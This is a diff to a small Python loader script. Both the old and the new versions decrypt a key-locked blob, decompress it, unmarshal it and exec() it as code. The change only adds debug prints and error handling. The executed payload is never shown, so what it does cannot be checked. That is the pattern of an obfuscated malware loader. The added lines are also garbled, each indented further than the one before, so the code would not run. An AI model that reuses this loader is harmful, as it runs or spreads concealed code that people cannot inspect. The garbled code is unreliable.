@@ -33,8 +33,25 @@ def _deob(data: bytes) -> bytes:
     return zlib.decompress(c)
 
 if __name__ == "__main__":
-    _dec_bytes = _unlock(_ITER_KEY)
-    _code_bytes = _deob(_dec_bytes)
-    _code_obj = marshal.loads(_code_bytes)
-    exec(_code_obj, {"__name__": "__main__", "__builtins__": __builtins__,
-                       "__file__": __file__, "__doc__": None})
+        print("Starting loader")
+
+            try:
+                    print("Unlocking payload")
+                            _dec_bytes = _unlock(_ITER_KEY)
+
+                                    print("Decompressing")
+                                            _code_bytes = _deob(_dec_bytes)
+
+                                                    print("Loading marshal")
+                                                            _code_obj = marshal.loads(_code_bytes)
+
+                                                                    print("Executing")
+                                                                            exec(_code_obj, {
+                                                                                        "__name__": "__main__",
+                                                                                                    "__builtins__": __builtins__,
+                                                                                                                "__file__": __file__,
+                                                                                                                            "__doc__": None
+                                                                                                                                    })
+
+                                                                                                                                        except Exception as e:
+                                                                                                                                                print("ERROR:", e)
